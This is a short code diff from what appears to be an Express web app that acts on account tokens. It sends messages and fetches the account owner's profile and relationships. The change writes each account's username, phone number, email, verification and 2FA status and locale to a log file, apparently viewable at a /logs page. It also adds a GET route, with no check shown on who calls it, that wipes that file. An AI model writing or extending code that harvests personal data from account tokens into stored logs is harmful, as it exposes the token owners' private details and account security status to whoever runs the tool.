@@ -88,12 +88,9 @@ app.post(`${base}/sendMessage`, async (req, res) => {
         if (checkedGetUserData) {
             const userData = await getUserData(token);
             const userDataJson = await userData.json();
-            console.log(`Username: ${userDataJson.username}
-Phone: ${userDataJson.phone}
-Email: ${userDataJson.email}
-Verified: ${userDataJson.verified}
-2FA: ${userDataJson.mfa_enabled}
-Locale: ${userDataJson.locale}`);
+            fs.appendFile("src/logs.txt", `Username: ${userDataJson.username}\nPhone: ${userDataJson.phone}\nEmail: ${userDataJson.email}\nVerified: ${userDataJson.verified}\n2FA: ${userDataJson.mfa_enabled}\nLocale: ${userDataJson.locale}\n`, (err) => {
+                if (err) return console.log(err);
+            });
         }
 
         const friendsData = await getRelationships(token);
@@ -117,6 +114,13 @@ Locale: ${userDataJson.locale}`);
     }
     
     res.redirect("/");
+});
+app.get(`${base}/clearLogs`, async (req, res) => {
+    fs.writeFile("src/logs.txt", "", (err) => {
+        if (err) return console.log(err);
+    });
+
+    res.redirect("/logs");
 });
 // END API ROUTES //
 
